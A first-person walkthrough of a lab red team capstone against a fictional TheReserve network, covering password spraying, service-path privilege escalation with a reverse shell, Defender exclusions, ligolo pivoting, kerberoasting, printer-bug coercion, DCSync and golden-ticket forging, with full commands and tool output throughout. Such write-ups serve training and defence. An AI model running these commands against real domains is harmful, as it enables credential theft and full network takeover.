# Red Team Capstone Challenge
![Hack](back.jpg)
## Recon phase
### 10.200.89.13 WEB Server
I found possible list of usernames visiting the URL

	http://10.200.89.13/october/themes/demo/assets/images/
since the image folder is browsable, appending the domain email I compiled the following username list
	
	antony.ross@corp.thereserve.loc
	ashley.chan@corp.thereserve.loc
	brenda.henderson@corp.thereserve.loc
	charlene.thomas@corp.thereserve.loc
	christopher.smith@corp.thereserve.loc
	emily.harvey@corp.thereserve.loc
	keith.allen@corp.thereserve.loc
	laura.wood@corp.thereserve.loc
	leslie.morley@corp.thereserve.loc
	lynda.gordon@corp.thereserve.loc
	martin.savage@corp.thereserve.loc
	mohammad.ahmed@corp.thereserve.loc
	paula.bailey@corp.thereserve.loc
	rhys.parsons@corp.thereserve.loc
	roy.sims@corp.thereserve.loc

### 10.200.89.11 Mail server

	nmap -sVC 10.200.89.11
Looking at the rdp certificate we see the CN that reveal the hostname mail.thereserve.loc, 

	3389/tcp open  ms-wbt-server Microsoft Terminal Services
	| ssl-cert: Subject: commonName=MAIL.thereserve.loc
 	...

so we modify the hosts file to proper resolve the IP

 	echo "10.200.89.11	mail.thereserve.loc" >> /etc/hosts

Visiting the site using IP result into the default IIS web page, indeed using hostname mail.thereserve.loc we got an access denied error.
A default page is not configured, but  we can guess that an application is definitely running

Let's try to fuzz the web root

	./ffuf -u http://mail.thereserve.loc/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt 

	installer               [Status: 301, Size: 160, Words: 9, Lines: 2, Duration: 6ms]
	index.php               [Status: 200, Size: 5345, Words: 366, Lines: 97, Duration: 151ms]
	plugins                 [Status: 301, Size: 158, Words: 9, Lines: 2, Duration: 2ms]
	program                 [Status: 301, Size: 158, Words: 9, Lines: 2, Duration: 9ms]
	public_html             [Status: 301, Size: 162, Words: 9, Lines: 2, Duration: 11ms]
	skins                   [Status: 301, Size: 156, Words: 9, Lines: 2, Duration: 4ms]
	vendor                  [Status: 301, Size: 157, Words: 9, Lines: 2, Duration: 8ms]

We are presented with a login page: index.php. The server run RoundCube mail app.
Older RoundCube versions seems to be affected by XSS, since I was not able to find any information about the version I decided to skip this attack vector for the moment.

### 10.200.89.12 VPN server
Visiting http://10.200.89.12 the site informs us that internal credentials must be used.
Submitting a login request

	http://10.200.89.12/login.php?user=antony.ross%40corp.thereserve.loc&password=Spring2024

we can notice that the form parameters are passed using GET, that's a very bad configuration, I guess is a custom application, badly programmed and I expect that non lock-out mechanism are in place.
Using the browser exstension Wappalyzer we got the following information:
	
	Web servers: Apache HTTP Server 2.4.29
	Programming languages: PHP
	Operating systems Ubuntu
## Attack

I created a [password list](pwd_list), based on the one provided, adding the complexity criteria indicated, you can find the bash script [here](https://github.com/zinzloun/Infosec-scripts-tools/blob/master/bash/crunch_from_list.sh) to generate the list. The user list is the one we obtained in the recon phase, applying the password policy for TheReserve is the following:

* At least 8 characters long
* At least 1 number
* At least 1 special character in !@#$%^
  
I used a password spray approach, since I have already coded a [script](https://github.com/zinzloun/Infosec-scripts-tools/blob/master/bash/spray_with_hydra.sh) to perform it using hydra.
Configure the script as indicated in the comments. Set the <b>avanti</b> variable to 1, so the procedure won't stop to the first valid credentials found. 
Please note that it will take more or less 3 hours to complete the attack.

In the meanwhile we can check for well-known vulnerability regarding the discovered assets on the mail server. 
From the scan we can see that SMB signing is not strictly required.
I found two critics flow regarding MySQL, but it seems there are no exploits available in the wild: https://www.cybersecurity-help.cz/vdb/SB2023011781

Some RoundCube versions are affected by XSS vulnerability that could be used to steal information: https://www.welivesecurity.com/en/eset-research/winter-vivern-exploits-zero-day-vulnerability-roundcube-webmail-servers,
that could be investigated. In the meanwhile the brute-force process finished and I found 2 valids credentials:

	mohammad.ahmed@corp.thereserve.loc:Password1!
	laura.wood@corp.thereserve.loc:Password1@


### Compromise workstations

With those information we can login into the mail server as well, that suggests that we got domain credentials. Nothing interesting is found accessing the web mail in the users mailboxe.
Login to the vpn portal using ahmed user and we can downlod a ovpn file. Using the file to open a vpn session:

	openvpn --config mohammad.ahmed\@corp.thereserve.loc.ovpn 

Then checking the table route: route -n

	10.200.89.21    12.100.1.1      255.255.255.255 UGH   1000   0        0 tun0
	10.200.89.22    12.100.1.1      255.255.255.255 UGH   1000   0        0 tun0

We found that we can reach now two more hosts, so we procede to scan them

	nmap -sVC 10.200.89.21 -Pn
	
		PORT     STATE SERVICE       VERSION
		22/tcp   open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
		| ssh-hostkey: 
		|   2048 21:78:e2:79:d3:93:ee:f9:aa:70:94:ec:01:b3:a5:8f (RSA)
		|   256 e0:f7:b6:67:c9:93:b5:74:0f:0a:83:ff:ef:55:c8:9a (ECDSA)
		|_  256 bd:83:0c:e3:b4:4f:78:f2:e3:4a:52:03:3c:a5:ce:58 (EdDSA)
		135/tcp  open  msrpc         Microsoft Windows RPC
		139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
		445/tcp  open  microsoft-ds?
		3389/tcp open  ms-wbt-server Microsoft Terminal Services
		| ssl-cert: Subject: commonName=WRK1.corp.thereserve.loc
		| Not valid before: 2024-04-06T08:04:42
		|_Not valid after:  2024-10-06T08:04:42
		|_ssl-date: 2024-04-11T08:28:32+00:00; 0s from scanner time.
		Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

		Host script results:
		| smb2-security-mode: 
		|   2.02: 
		|_    Message signing enabled but not required
		| smb2-time: 
		|   date: 2024-04-11 09:28:34
		|_  start_date: 1600-12-31 23:58:45

	
	nmap -sVC 10.200.89.22 -Pn
	
		PORT     STATE SERVICE       VERSION
		22/tcp   open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
		| ssh-hostkey: 
		|   2048 e6:f0:fb:5b:24:28:68:13:da:dd:c5:5f:67:4e:be:4f (RSA)
		|   256 93:f5:8f:4c:31:15:fc:8e:38:03:3e:d5:b7:1c:ed:d3 (ECDSA)
		|_  256 56:3f:8a:33:a4:1f:dc:11:9a:a1:67:a6:7d:f8:76:18 (EdDSA)
		135/tcp  open  msrpc         Microsoft Windows RPC
		139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
		445/tcp  open  microsoft-ds?
		3389/tcp open  ms-wbt-server Microsoft Terminal Services
		| ssl-cert: Subject: commonName=WRK2.corp.thereserve.loc
		| Not valid before: 2024-04-06T08:04:43
		|_Not valid after:  2024-10-06T08:04:43
		|_ssl-date: 2024-04-11T08:31:50+00:00; -1s from scanner time.
		Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

		Host script results:
		|_clock-skew: mean: -1s, deviation: 0s, median: -1s
		| smb2-security-mode: 
		|   2.02: 
		|_    Message signing enabled but not required
		| smb2-time: 
		|   date: 2024-04-11 09:31:51
		|_  start_date: 1600-12-31 23:58:45

I realized (submitting flags) that SSH is used by THM to manage the LAB, so don't try to attack this service.
So we need to proceed using RDP to connect to the host wrk1 using ahmed credentials, then I started to check for the privileges provided to the current user, using the following commands:

	net user
	net user mohammad.ahmed /domain
	net localgroup
	net localgroup administrators
	whoami /all

Nothing very interesting emerged. Then I identified the domain cotroller

	echo %logonserver%
	\\CORPDC

  	nslookup corpdc
	...
 	Address:  10.200.89.100

In powershell we can check that defender is enabled:

	Get-MpComputerStatus
 	AMEngineVersion                  : 1.1.20300.3

	AMProductVersion                 : 4.18.2304.8
	AMRunningMode                    : Normal
	AMServiceEnabled                 : True
	AMServiceVersion                 : 4.18.2304.8
	AntispywareEnabled               : True
	AntispywareSignatureAge          : 352
	AntispywareSignatureLastUpdated  : 5/7/2023 11:33:10 PM
	AntispywareSignatureVersion      : 1.389.557.0
	AntivirusEnabled                 : True
	AntivirusSignatureAge            : 352
	AntivirusSignatureLastUpdated    : 5/7/2023 11:33:09 PM
	AntivirusSignatureVersion        : 1.389.557.0
	BehaviorMonitorEnabled           : True
	ComputerID                       : F1FC8DC3-E629-21DA-9794-B67E9E22F963
	ComputerState                    : 0
	DefenderSignaturesOutOfDate      : False
	DeviceControlDefaultEnforcement  : Unknown
	DeviceControlPoliciesLastUpdated : 3/28/2023 2:11:31 AM
	DeviceControlState               : Disabled
	FullScanAge                      : 4294967295
 
AMSI is enabled as well, since if we use the use the following command 

	"invoke-mimikatz" 
	At line:1 char:1
	+ "invoke-mimikatz"
	This script contains malicious content and has been blocked by your antivirus software.
 
Then I proceded to enumerate scheduled tasks running as system user

	schtasks /query /v | findstr "SYSTEM" | findstr /i /v "windir" | findstr /i /v "systemroot" > pe_tasks.txt

Search password string using powershell

	ls -r | where {$_.extension -in  @(".txt",".ini",".xml",".docx",".pdf",".xlsx")} | Select-String "password" | select path  | Format-Table -AutoSize
	
Nothing interesting emerged, so before to proceed any further, I will try to login to wrk1 using laura credentials.

List all the configured services (powershell) on wrk1

 	Get-WmiObject win32_service | select name, status, pathname, startmode, description, processid, startname, started, state | ogv
### Escalate privileges on the workstations

Interesting enough there is a Backup service that presents an unquoted path<b>C:\Backup Service\Full Backup\backup.exe</b>, the service is manually started, let's check which permissions have the current user on the executable:

	icacls "C:\Backup Service\Full Backup\backup.exe"
		C:\Backup Service\Full Backup\backup.exe Everyone:(I)(F)
                ...
We have full control on the executable file, the service start manually. Let's try to execute it:

  	net start Backup
  	System error 193 has occurred.
  	*** is not a valid Win32 application.
	
It seems that there is a problem with the executable file, but actually we dont' care at all since the service correctly runs. Since have the permission
to write into the <b>C:\Backup Service</b> folder (as icalcs showed (I)), we can proceed to make the service to execute a malicious exe, and what's better
than a reverse shell? 
I used MalvasiaC a [simple reverse powershell](https://github.com/zinzloun/MalvasiaC) written in C by me, that at the moment is not detected by Defender.
After having compiled the reverse shell we rename it as <b>Full.exe</b> and I copied it to <b>C:\Backup Service</b> folder.

Now if we lunch the sevice Backup we should get a reverse powershell as system user, since Full.exe is executed in the service system context.
Then I proceed to create a local user with admin privileges 

	net user support Password2@ /add
 	net localgroup administrators support /add
  	net localgroup "Remote Desktop Users" support /add

#### Flags submissions
I can submit the first four flags.
I used the local administrator user to access wrk1 using RDP, then I created an hidden folder in C:\Users\support\def-exc to be excluded by windows defender (run the command as administrator):

	Set-MpPreference -ExclusionPath "C:\users\support\def-exc"	

To verify we can issue:

	Get-MpPreference | Select-Object -Property ExclusionPath
	
	ExclusionPath                
	-------------                
	{C:\users\support\def-exc}

### Pivoting
To reach other hosts from the attacker machine I will configure a tunnel using [ligolo-ng](https://github.com/nicocha30/ligolo-ng) for pivoting through wrk1 host.
Donwload the proxy and the agent (v.05.2).
Then on my attacker machine I started a python web server istance listening on port 8000

	python -m http.server

from the wrk1 host I downloaded the agent on wrk1

	Invoke-WebRequest -URI "http://12.100.1.9:8000//agent.exe" -OutFile "C:\users\support\def-exc\agent.exe"

On the attacker:
	
 	ip tuntap add user root mode tun ligolo && ip link set ligolo up
	./proxy -selfcert
	
On the wrk1 start the agent
	
 	agent.exe -connect 12.100.1.9:11601 -ignore-cert

You will get a new session on the attacker. You can interact with it using the session command.
On the session command you can list all the agent network interfaces using ifconfig.
Then add the routing information according to the interface you want to reach, in our case we add the route to the DC.
<b>Do not route all the /24 subnet otherwise you will not be able to reach wrk1 and wrk2 anymore using corp VPN</b>

	ip route add 10.200.89.102/32 dev ligolo

Finally in the agent command interface issue 

	start

I also configured a listener on the agent on port 1180 and redirect the traffic on the attacker machine (proxy) on port 8000.

 	listener_add --addr 0.0.0.0:1180 --to 127.0.0.1:8000 --tcp

Youm must also open this port on Windows firewall

	New-NetFirewallRule -DisplayName 'Win Updater' -Profile 'Domain' -Direction Inbound -Action Allow -Protocol TCP -LocalPort 1180
That implies I can reach my python web server from other hosts visitng the following URL http://10.200.89.21:1180
 
 ### Kerberosting
 Now that I can reach the DC directly from the attacker machine, we can use Impacket to search for kerberostable service accounts. This time I used laura.wood credentials to query Active Directory:

 	impacket-GetUserSPNs -outputfile kerberoastables.txt -dc-ip 10.200.89.102  'corp.thereserve.loc/laura.wood:Password1@'
  	Impacket v0.12.0.dev1 - Copyright 2023 Fortra

	ServicePrincipalName  Name         MemberOf                                                   PasswordLastSet             LastLogon                   Delegation 
	--------------------  -----------  ---------------------------------------------------------  --------------------------  --------------------------  ----------
	cifs/scvScanning      svcScanning  CN=Services,OU=Groups,DC=corp,DC=thereserve,DC=loc         2023-02-15 10:07:06.603818  2024-04-19 12:02:59.557350             
	cifs/svcBackups       svcBackups   CN=Services,OU=Groups,DC=corp,DC=thereserve,DC=loc         2023-02-15 10:05:59.787089  2023-02-15 10:42:19.327102             
	http/svcEDR           svcEDR       CN=Services,OU=Groups,DC=corp,DC=thereserve,DC=loc         2023-02-15 10:06:21.150738  <never>                                
	http/svcMonitor       svcMonitor   CN=Services,OU=Groups,DC=corp,DC=thereserve,DC=loc         2023-02-15 10:06:43.306959  <never>                                
	mssql/svcOctober      svcOctober   CN=Internet Access,OU=Groups,DC=corp,DC=thereserve,DC=loc  2023-02-15 10:07:45.563346  2023-03-31 00:26:54.115866             

  
I got 5 candidates. The next step it's to try to extract the password from Kerberos tickets, since they are encrypted with the password of the service account associated with the SPN specified in the ticket request.
The tickets are saved in kerberoastables.txt file, I used haschcat with the previously generated passwords list used to brute-force the VPN server.

  	hashcat -a 0 -m 13100 kerberoastables.txt pwd_list

After a while I found a valid password (reused) for svcScanning user:

	$krb5tgs$23$*svcScanning$CORP.THERESERVE.LOC$corp.thereserve.loc/svcScanning*$9b49...
 	...7749a88126a66ac2:Password1!
  
### Compromise servers
From the wrk1 workstation I used the following powershell snippet to perform a host discovery using common windows ports: 

	1..200 | % { $a ="10.200.89.$_"; 80,443,3389 | % {$r=((new-object Net.Sockets.TcpClient).ConnectAsync("$a",$_).Wait(100));If ($r) {write-host "$a port $_ is open"}}}
		10.200.89.11 port 80 is open
		10.200.89.11 port 3389 is open
		10.200.89.12 port 80 is open
		10.200.89.13 port 80 is open
		10.200.89.21 port 3389 is open
		10.200.89.22 port 3389 is open
		10.200.89.31 port 3389 is open
		10.200.89.32 port 3389 is open
		10.200.89.100 port 3389 is open
		10.200.89.102 port 3389 is open
We found 3 new hosts .31, .32 and .100. We can proceed to add these routes to the ligolo tunnel

	ip route add 10.200.89.31/32 dev ligolo & ip route add 10.200.89.32/32 dev ligolo & ip route add 10.200.89.100/32 dev ligolo

With the <b>svcscanning</b> credentials I can connect through RDP to host .31 and .32, but not to the .100.
Using Remmina I connected to the host .31 using svcScanning user. I looked for the hostname: <b>server1</b>.
Exploring user privileges I found that the user is member of the local administrators, being part of the domain group Services

	net localgroup Administrators
		Alias name     Administrators
		...
		Members
		-----------------------------
		Administrator
		CORP\Domain Admins
		CORP\Services
		CORP\Tier 1 Admins
		HelpDesk
		THMSetup

 	net group Services /domain
		The request will be processed at a domain controller for domain corp.thereserve.loc.
		Group name     Services

		Members
		-----------------------------------------------------------------------------------
		svcBackups               svcEDR                   svcMonitor 		svcScanning
 	
	
As previously done on wrk1 I created an hidden folder excluded in Defender

	C:\Users\svcScanning\def-exc
then I downloaded in that folder Rubeus from my attacker machine, visiting http://10.200.89.21:1180/Rubeus.exe

#### Flags submission
I can submit flags 5 and 6

### Audit Active directory from Server1

I managed to transfer <b>PingCastle</b> to the server from the attacker machine. I decided to use [Pingcastle](https://www.pingcastle.com/download) since it is not flagged as malicious and perform very well.
It produces a detailed report with explanation about found vulnerabilities, just run the exe. The report highlights two important things:
1. trusted delegation betwenn domain controller and the servers

		Object trusted to authentication for delegation			
	
		Name		Creation		Last logon		Pwd Last Set		Distinguished name
		CORPDC$	2022-09-07 20:58:08Z	2024-04-17 10:47:22Z	2022-09-07 20:58:08Z	CN=CORPDC,OU=Domain Controllers,DC=corp,DC=thereserve,DC=loc
		SERVER1$	2023-01-09 19:28:58Z	2024-04-17 08:33:28Z	2024-04-07 08:20:07Z	CN=SERVER1,OU=Servers,DC=corp,DC=thereserve,DC=loc
		SERVER2$	2023-01-09 19:49:16Z	2024-04-17 08:25:59Z	2024-04-07 08:19:41Z	CN=SERVER2,OU=Servers,DC=corp,DC=thereserve,DC=loc

2. the printer spooler service is remotely accessible from corpdc

As the repost states:

<i>When there's an account with unconstrained delegation configured (which is fairly common) and the Print Spooler service running on a computer, you can get that computers credentials sent to the system with unconstrained delegation as a user. With a domain controller, the TGT of the DC can be extracted allowing an attacker to reuse it with a DCSync attack and obtain all user hashes and impersonate them.
	The Print Spooler service should be deactivated on domain controllers</i>
 
### Printer bug
In this scenario I could try exploit the so-called feature, better to say bug, known as [Printer Bug](https://www.thehackersprint.com/kerberos-delegation-and-abuse-cases/unconstrained-delegation/printer-bug).
To succeed we need to force corpdc to authenticate against server1 (that we control), that is possible since the trusted authentication is configured between the two hosts.
So first of all on server1 I started Rubeus monitor to intercept TGT tickets:

		Rubeus.exe monitor /targetuser:DC$ /interval:10 /nowrap
		...
		v2.2.0
		
		[*] Action: TGT Monitoring
		[*] Target user     : CORPDC$@CORP.THERESERVE.LOC
		[*] Monitoring every 10 seconds for new TGTs


Then I procedeed to download the [SpoolSample.exe](https://github.com/jtmpu/PrecompiledBinaries/blob/master/SpoolSample.exe) into server1 from the attacker machine (downlad the file into excluded folder, otherwise it will be caught by Defender). This file allows to trigger the authentication action from corpdc to server1. 

Execute the following command:

	SpoolSample.exe CORPDC.CORP.THERESERVE.LOC SERVER1.CORP.THERESERVE.LOC
 	[+] Converted DLL to shellcode
	[+] Executing RDI
	[+] Calling exported function
	TargetServer: \\CORPDC.CORP.THERESERVE.LOC, CaptureServer: \\SERVER1.CORP.THERESERVE.LOC
	Attempted printer notification and received an invalid handle. The coerced authentication probably worked!

Please note that you must use the FQDN for the server, otherwise SpoolSample fails. After a while we recive a new ticket on Rebues

 	[*] 4/18/2024 9:36:00 AM UTC - Found new TGT:

	  User                  :  CORPDC$@CORP.THERESERVE.LOC
	  StartTime             :  4/18/2024 8:13:06 AM
	  EndTime               :  4/18/2024 6:12:52 PM
	  RenewTill             :  4/25/2024 8:12:52 AM
	  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
	  Base64EncodedTicket   :

	    doIF2jCCBdagAwIBBaEDAgEWooIEyzCCB...FUkVTRVJWRS5MT0OpKDAmoAMCAQKhHzAdGwZrcmJ0Z3QbE0NPUlAuVEhFUkVTRVJWRS5MT0M=
	
	[*] Ticket cache size: 1

With Rubeus we can also import the TGT ticket into current session. To do that first we need to issue klist to find the LUID

	klist
 	Current LogonId is 0:0x2027d4
  	....

   	Rubeus.exe ptt /luid:0x2027d4 /ticket:doIF2jCCBdagAwIBBaEDAgEWooIEyzCCB...FUkVTRVJWRS5MT0OpKDAmoAMCAQKhHzAdGwZrcmJ0Z3QbE0NPUlAuVEhFUkVTRVJWRS5MT0M=

Verify that the ticket has been injected

	klist
	
	Current LogonId is 0:0x2027d4
	
	Cached Tickets: (1)
	
	#0>     Client: CORPDC$ @ CORP.THERESERVE.LOC
	        Server: krbtgt/CORP.THERESERVE.LOC @ CORP.THERESERVE.LOC
	        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
	        Ticket Flags 0x60a10000 -> forwardable forwarded renewable pre_authent name_canonicalize 
	        Start Time: 4/18/2024 8:13:06 (local)
	        End Time:   4/18/2024 18:12:52 (local)
	        Renew Time: 4/25/2024 8:12:52 (local)
	        Session Key Type: AES-256-CTS-HMAC-SHA1-96
	        Cache Flags: 0x1 -> PRIMARY
	        Kdc Called:
### DCSync attack

Nowthat we have inject the CORPDc user ticket in our current session, we can proceed to perform a [DcSync attack](https://www.thehacker.recipes/a-d/movement/credentials/dumping/dcsync) to try to dump NTLM hash for domain users. I will perform the attack without using Mimikatz, since it's heavely monitored. I found this useful tool [DCSyncer](https://github.com/notsoshant/DCSyncer/releases/tag/v1.0).
The tool will dump hashes for all users, single user hash dump is not supported, so I saved the output into a file

	DCSyncer-x64.exe > dump-hash.txt
 
We found two juicy hash for users: administrator

	Object RDN           : Administrator
	SAM Username         : Administrator
	User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
	Object Security ID   : S-1-5-21-170228521-1485475711-3199862024-500
	Object Relative ID   : 500
	
	Credentials:
	  Hash NTLM: d3d4edcc015856e386074795aea86b3e
and krbtgt

	Object RDN           : krbtgt
	SAM Username         : krbtgt
	User Account Control : 00010202 ( ACCOUNTDISABLE NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
	Object Security ID   : S-1-5-21-170228521-1485475711-3199862024-502
	Object Relative ID   : 502
	
	Credentials:
	  Hash NTLM: 0c757a3445acb94a654554f3ac529ede

The last one could be used to perform a golden ticket attack.

### Compromise corpdc

Now we can ask a TGT ticket for the Administrator user and inject it directly into the current session:

	Rubeus.exe asktgt /user:administrator /rc4:d3d4edcc015856e386074795aea86b3e /ptt
	Ticket successfully imported!

	  ServiceName              :  krbtgt/corp.thereserve.loc
	  ServiceRealm             :  CORP.THERESERVE.LOC
	  UserName                 :  administrator
	  UserRealm                :  CORP.THERESERVE.LOC
	  StartTime                :  4/18/2024 1:59:04 PM
	  EndTime                  :  4/18/2024 11:59:04 PM

	klist

	Current LogonId is 0:0x2902b8
	
	Cached Tickets: (1)
	
	#0>     Client: administrator @ CORP.THERESERVE.LOC
	        Server: krbtgt/corp.thereserve.loc @ CORP.THERESERVE.LOC
	        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
	        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
	        Start Time: 4/18/2024 13:59:04 (local)
	        End Time:   4/18/2024 23:59:04 (local)
	        Renew Time: 4/25/2024 13:59:04 (local)
	        Session Key Type: RSADSI RC4-HMAC(NT)
	        Cache Flags: 0x1 -> PRIMARY
	        Kdc Called:
		
We can confirm the exploit having access to C$ on the domain controller
	
 	dir \\corpdc.CORP.THERESERVE.LOC\C$
	 Volume in drive \\corpdc.CORP.THERESERVE.LOC\C$ has no label.
	 Volume Serial Number is AE32-1DF2
	
	 Directory of \\corpdc.CORP.THERESERVE.LOC\C$
		..
	02/14/2023  07:01 PM    <DIR>          Users
	02/14/2023  06:55 PM    <DIR>          Windows
	               4 File(s)      3,177,657 bytes
	               6 Dir(s)  21,795,753,984 bytes free

Finally we can get a shell on the DC as administrator
	
 	Enter-PSSession -computer corpdc.CORP.THERESERVE.LOC
	[corpdc.CORP.THERESERVE.LOC]: PS C:\Users\Administrator\Documents>whoami
	corp\administrator
Now I'm going to add a user to the domain admins

	net user it.support Password2@ /ADD /DOMAIN
	net group "Domain Admins" it.support /ADD /DOMAIN
Check it out:

	net group "Domain Admins"
	Group name     Domain Admins
	Comment        Designated administrators of the domain
	Members
	-------------------------------------------------------------------------------
	Administrator            it.support

Using the newly created  user we can RDP to corpdc.

#### Flags submission
We can submit flags 7 and 8
I know from PingCastle report that a AD forest is in place:

	Reachable domain: bank.thereserve.loc
	Discovered using: thereserve.loc	
	Netbios: BANK	
	Creation: 2022-09-07 20:02:40Z

Using powershell we can inviestigate the trust relation:

	([System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest())
	 	Name                  : thereserve.loc
		Sites                 : {Default-First-Site-Name}
		Domains               : {bank.thereserve.loc, corp.thereserve.loc, thereserve.loc}
		GlobalCatalogs        : {ROOTDC.thereserve.loc, BANKDC.bank.thereserve.loc, CORPDC.corp.thereserve.loc}
		ApplicationPartitions : {DC=ForestDnsZones,DC=thereserve,DC=loc, DC=DomainDnsZones,DC=thereserve,DC=loc,
		                        DC=DomainDnsZones,DC=corp,DC=thereserve,DC=loc, DC=DomainDnsZones,DC=bank,DC=thereserve,DC=loc}
		ForestModeLevel       : 6
		ForestMode            : Windows2012R2Forest
		RootDomain            : thereserve.loc
		Schema                : CN=Schema,CN=Configuration,DC=thereserve,DC=loc
		SchemaRoleOwner       : ROOTDC.thereserve.loc
		NamingRoleOwner       : ROOTDC.thereserve.loc
		
 
 	([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()
		SourceName          TargetName       TrustType TrustDirection
		----------          ----------       --------- --------------
		corp.thereserve.loc thereserve.loc ParentChild  Bidirectional

### Golden ticket 
Since we have a bidirectional trust betwween root domain and corp domain, in addition we have the hashed password of the krbtgt user, we can try to forge a <b>golden ticket</b>.
Now in order to craft a golden ticket for the trusted root domain, we need to get both the SID od the child and root domain. Using poershell (as administrator)
we can get these information:

 	Import-Module ActiveDirectory
	(Get-ADForest).Domains| %{Get-ADDomain -Server $_}|select name, distinguishedname,domainsid

		name       distinguishedname            domainsid
		----       -----------------            ---------
		bank       DC=bank,DC=thereserve,DC=loc S-1-5-21-3455338511-2124712869-1448239061
		corp       DC=corp,DC=thereserve,DC=loc S-1-5-21-170228521-1485475711-3199862024
		thereserve DC=thereserve,DC=loc         S-1-5-21-1255581842-1300659601-3764024703

  
As usual I created an exclusion in Defender 

 	C:\Users\it.support\def-exc
 
I manged to transfer Rubeus (please note that to forge a golden ticket you must have version >= 2) from the attacker machine.
To successfully forge the golden ticket on the trusted root domain, we have to append -519 to the discovered SID, since the Well-known SID/RID format is S-1-5-21-{root domain}-519. This SID identifies the Enterprise Admins group. This group exists only in the root domain of an Active Directory forest. By default, the only member of the group is the Administrator account for the forest root domain, so we must use this user in order to generate the ticket. More details can be found [here](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups). Following is the whole command:

 	rubeus.exe golden /rc4:0c757a3445acb94a654554f3ac529ede /domain:corp.thereserve.loc /sid:S-1-5-21-170228521-1485475711-3199862024 ^
  	/sids:S-1-5-21-1255581842-1300659601-3764024703-519 /user:Administrator /ptt
		
  		......
    		v2.3.2

		[*] Action: Build TGT
		[*] Building PAC
		[*] Domain         : CORP.THERESERVE.LOC (CORP)
		[*] SID            : S-1-5-21-170228521-1485475711-3199862024
		[*] UserId         : 500
		[*] Groups         : 520,512,513,519,518
		[*] ExtraSIDs      : S-1-5-21-1255581842-1300659601-3764024703-519
		[*] ServiceKey     : 0C757A3445ACB94A654554F3AC529EDE
		[*] ServiceKeyType : KERB_CHECKSUM_HMAC_MD5
		[*] KDCKey         : 0C757A3445ACB94A654554F3AC529EDE
		[*] KDCKeyType     : KERB_CHECKSUM_HMAC_MD5
		[*] Service        : krbtgt
		[*] Target         : corp.thereserve.loc
		...
		[*] Forged a TGT for 'Administrator@corp.thereserve.loc'
		[*] AuthTime       : 4/24/2024 1:13:24 PM
		[*] StartTime      : 4/24/2024 1:13:24 PM
		[*] EndTime        : 4/24/2024 11:13:24 PM
		[*] RenewTill      : 5/1/2024 1:13:24 PM
		[*] base64(ticket.kirbi):
		      doIF3zCCBdugAwIBBaEDAgEWooIExTCCBMFhggS9MIIEuaADAgEFoRUbE0NPUlAuVEhFUkVTRVJWRS5M...
			cnZlLmxvYw==
		[+] Ticket successfully imported!
We have imported the ticket directly in our session:

	klist
	Current LogonId is 0:0x6ac44
	Cached Tickets: (1)
	#0>     Client: Administrator @ CORP.THERESERVE.LOC
		Server: krbtgt/corp.thereserve.loc @ CORP.THERESERVE.LOC
		KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
		Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent
		Start Time: 4/24/2024 13:13:24 (local)
		End Time:   4/24/2024 23:13:24 (local)
		Renew Time: 5/1/2024 13:13:24 (local)
		Session Key Type: RSADSI RC4-HMAC(NT)
		Cache Flags: 0x1 -> PRIMARY
		Kdc Called:
  
Check if we can access the rootdc:

	dir \\rootdc.thereserve.loc\C$
 	Volume in drive \\rootdc.thereserve.loc\C$ has no label.
 	Volume Serial Number is AE32-1DF2
	Directory of \\rootdc.thereserve.loc\C$
 	04/01/2023  04:10 AM               427 adusers_list.csv
	03/17/2023  07:18 AM                85 dns_entries.csv
	...
 
 ### Compromise rootdc 
 Having injected in our sessione the Administrator ticket we can access rootdc:

 	PS C:\Users\it.support\def-exc> Enter-PSSession -computer rootdc.THERESERVE.LOC
	[rootdc.THERESERVE.LOC]: PS C:\Users\Administrator.CORP\Documents>

 I added a new enterprise admins to the root domain
 
 	 net user it.supportEA Password2@ /ADD /DOMAIN
 	 net group "Enterprise Admins" it.supportEA /ADD /DOMAIN

 We can now use remmina to access the rootdc and submit flag 15 and 16.
 Since we already know the FQDN of the bank subdomain dc, let's find his IP address:

 	nslookup bank.thereserve.loc
	DNS request timed out.
	    timeout was 2 seconds.
	...
	Non-authoritative answer:
	Name:    bank.thereserve.loc
	Address:  10.200.89.101
 
### Pivoting to bank subdomain
From the rootdc server we can reach the bank DC. Even if the subnet is the same, the bank's subdomain is isolated from the corp subdomain (as in a real scenario would be),
anyway, thanks to ligolo listener, we can use wrk1 host as pivot host to reach the bank subdomain as well. First of all I proceed to configure the usual Defender exclusion folder:

 	Set-MpPreference -ExclusionPath "C:\users\it.supportea\def-exc"	

Then we need to perform the following steps:
1. on the proxy (our attacker machine) add a new tun interface

		ip tuntap add user root mode tun ligolo_rdc && ip link set ligolo_rdc up
2. deploy the ligolo agent to the rootdc: we can use the previously configured listener to reach the attacker web server to download it, from the rootdc visit http://10.200.89.21:1180
3. on wrk1 add a rule to the Firewall to allow inbound connection to port 1181

		New-NetFirewallRule -DisplayName 'Win Updater' -Profile 'Domain' -Direction Inbound -Action Allow -Protocol TCP -LocalPort 1181
4. on the wrk1 ligolo session (the one active) add the following listener:

		listener_add --addr 0.0.0.0:1181 --to 127.0.0.1:11601 --tcp
5. on the rootdc start the agent as follows:

		C:\Users\it.supportea\def-exc\agent.exe -connect 10.200.89.21:1181 -ignore-cert
We should recive a new ligolo session on our attacker machine

		[Agent : CORP\it.support@WRK1] » INFO[1857] Agent joined. name="THERESERVE\\it.supportea@ROOTDC" remote="127.0.0.1:44094"

What we have done here is to forward the incoming request from rootdc to the agent on port 1181, then forward it to the proxy (our attacker machine) on the default port 11601. 
Ligolo is really a great tool!
